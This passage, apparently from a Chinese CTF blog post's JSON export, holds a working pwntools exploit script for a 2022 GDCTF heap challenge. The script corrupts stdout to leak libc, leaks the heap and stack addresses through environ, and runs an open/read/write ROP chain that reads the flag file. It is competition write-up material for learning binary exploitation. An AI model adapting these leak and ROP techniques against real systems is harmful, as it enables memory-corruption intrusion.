class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Offset?&#x27;</span>, <span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    fake_size = <span class=\"number\">0x061</span> + <span class=\"number\">0x1000</span>*<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\"># add(,&#x27;aaaaa&#x27;)</span></span><br><span class=\"line\">    backdoor(<span class=\"number\">0x18</span>, <span class=\"number\">0x6b8</span>, p64(fake_size))</span><br><span class=\"line\">    add(<span class=\"number\">0x2000</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    add2(<span class=\"number\">0x10</span>, -<span class=\"number\">10</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    backdoor(<span class=\"number\">0x18</span>, -<span class=\"number\">3080</span>, <span class=\"string\">&#x27;\\xb0&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># backdoor(0x18, -32, &#x27;\\xb0&#x27;)</span></span><br><span class=\"line\">    backdoor(<span class=\"number\">0x18</span>, -<span class=\"number\">3616</span>+<span class=\"number\">6</span>, p32(<span class=\"number\">0x7</span>))</span><br><span class=\"line\">    stdout_in = <span class=\"number\">0x16a0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    backdoor(<span class=\"number\">0x18</span>, <span class=\"number\">800</span>, <span class=\"string\">&#x27;\\xa0\\x16&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># add2(0x18, 0, &#x27;aa&#x27;)</span></span><br><span class=\"line\">    flag = <span class=\"number\">0xfbad1800</span></span><br><span class=\"line\">    <span class=\"comment\"># add2(0x18, )</span></span><br><span class=\"line\">    add2(<span class=\"number\">0x48</span>, <span class=\"number\">1</span>, <span class=\"string\">&#x27;aa&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        add2(<span class=\"number\">0x48</span>, <span class=\"number\">0</span>, p64(flag)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + <span class=\"string\">&#x27;\\x08&#x27;</span>)</span><br><span class=\"line\">        inp = io.recv(<span class=\"number\">8</span>,timeout=<span class=\"number\">0.2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;1.add&#x27;</span> <span class=\"keyword\">in</span> inp:</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> <span class=\"number\">1</span> == <span class=\"number\">2</span></span><br><span class=\"line\">        stdin_addr = u64(inp)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;stdin_addr:&#x27;</span>+<span class=\"built_in\">hex</span>(stdin_addr))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = stdin_addr - <span class=\"number\">0x1ee7f0</span></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">main_arena_96 = <span class=\"number\">0x1ecbe0</span> + libc_base</span><br><span class=\"line\">edit2(<span class=\"number\">0</span>, p64(flag)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(main_arena_96))</span><br><span class=\"line\"></span><br><span class=\"line\">heap_base = u64(io.recv(<span class=\"number\">8</span>)) -<span class=\"number\">0x23010</span>  </span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;heap_base:&#x27;</span>+<span class=\"built_in\">hex</span>(heap_base))</span><br><span class=\"line\"></span><br><span class=\"line\">environ = <span class=\"number\">0x228138</span> + libc_base <span class=\"comment\"># 偏移量可能不同</span></span><br><span class=\"line\">edit2(<span class=\"number\">0</span>, p64(flag)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(environ) + p64(environ+<span class=\"number\">0x10</span>) + p64(environ+<span class=\"number\">0x10</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;environ:&#x27;</span>+<span class=\"built_in\">hex</span>(environ))</span><br><span class=\"line\"></span><br><span class=\"line\">stack_environ = u64(io.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;stack_environ:&#x27;</span>+<span class=\"built_in\">hex</span>(stack_environ))</span><br><span class=\"line\"></span><br><span class=\"line\">rax_0 = <span class=\"number\">0x00000000000b1d89</span> + libc_base <span class=\"comment\"># xor rax, rax ; ret</span></span><br><span class=\"line\">rax_1 = <span class=\"number\">0x00000000000cfb50</span> + libc_base <span class=\"comment\">#  mov rax, 1 ; ret</span></span><br><span class=\"line\">rax_2 = <span class=\"number\">0x00000000000cfb60</span> + libc_base <span class=\"comment\">#  mov rax, 2 ; ret</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000023b72</span> + libc_base <span class=\"comment\"># pop rdi ; ret</span></span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x000000000002604f</span> + libc_base <span class=\"comment\"># pop rsi ; ret</span></span><br><span class=\"line\">xchg_eax_edi = <span class=\"number\">0x00000000000f1b95</span> + libc_base <span class=\"comment\"># xchg eax, edi ; ret</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x00000630D9</span> + libc_base <span class=\"comment\"># syscall; ret in (funlockfile) </span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vuln_stack_tar = stack_environ - <span class=\"number\">0x138</span> + <span class=\"number\">0x20</span></span><br><span class=\"line\">backdoor2(<span class=\"number\">0x18</span>, -<span class=\"number\">512</span>, p64(vuln_stack_tar))</span><br><span class=\"line\"></span><br><span class=\"line\">add3(<span class=\"number\">0xf0</span>-<span class=\"number\">8</span>, <span class=\"number\">1</span>, <span class=\"string\">&#x27;aaaaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io.sendafter(&#x27;4.delete&#x27;, &#x27;1&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># io.sendlineafter(&#x27;Size?&#x27;, )</span></span><br><span class=\"line\"></span><br><span class=\"line\">rop_tmp = [</span><br><span class=\"line\">    pop_rdi, <span class=\"number\">0xadd</span>,</span><br><span class=\"line\">    pop_rsi, <span class=\"number\">0</span>,</span><br><span class=\"line\">    rax_2, syscall, <span class=\"comment\"># open</span></span><br><span class=\"line\">    xchg_eax_edi, <span class=\"comment\"># eax -&gt; edi fd</span></span><br><span class=\"line\">    pop_rsi, <span class=\"number\">0xadd</span>,</span><br><span class=\"line\">    rax_0, syscall, <span class=\"comment\"># read</span></span><br><span class=\"line\">    pop_rdi, <span class=\"number\">1</span>, </span><br><span class=\"line\">    rax_1, syscall <span class=\"comment\"># write</span></span><br><span class=\"line\">]</span><br><span class=\"line\">rop_tmp[<span class=\"number\">1</span>] = rop_tmp[<span class=\"number\">8</span>] = vuln_stack_tar + <span class=\"built_in\">len</span>(rop_tmp) * <span class=\"number\">8</span></span><br><span class=\"line\">rop_tmp = flat(rop_tmp) + <span class=\"string\">&#x27;./flag\\x00&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">add3(<span class=\"number\">0xf0</span>-<span class=\"number\">8</span>, <span class=\"number\">1</span>, rop_tmp)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>赛后的补题，比赛没时间了（菜），本地记得新建.&#x2F;flag文件</p>\n<p><img src=\"/p/2022gdCTF-pwn/image-20220524095329685.png\" alt=\"image-20220524095329685\"></p>\n","path":"/p/2022gdCTF-pwn/","permalink":"https://blog.csome.cc/p/2022gdCTF-pwn/","tags":[{"name":"CTF","_id":"cuidvZ3AUibcKOkbkNEMC3ltU","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuid9EjKHYI0JNtcQl-odZaE8","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"GDCTF","_id":"cuidzSfyuLM4s1vkvVLkmce6-","slug":"GDCTF","path":"tags/GDCTF/","permalink":"https://blog.csome.cc/tags/GDCTF/","length":1}],"categories":[],"prev":{"title":"[2022CISCN]华南赛区分区赛 部分Pwn wp","date":"2022-06-21T08:15:02.000Z","slug":"2022CISCN-hn-wp","published":true,"updated":"2025-10-28T08:00:40.720Z","_id":"cuidrgOnbsQTavXfynMdmVzOo","layout":"post","photos":[],"excerpt":"","path":"/p/2022CISCN-hn-wp/","permalink":"https://blog.csome.cc/p/2022CISCN-hn-wp/","__post":true},"next":{"title":"[2022春秋杯] Pwn chunzhiIot wp","date":"2022-05-08T17:02:18.000Z","slug":"2022cqb-pwn-chunzhiIot","published":true,"updated":"2025-10-28T08:00:40.724Z","_id":"cuidTDIW5f9EC6mOLteQDftsz","layout":"post","photos":[],"excerpt":"","path":"/p/2022cqb-pwn-chunzhiIot/","permalink":"https://blog.csome.cc/p/2022cqb-pwn-chunzhiIot/","__post":true},"__post":true}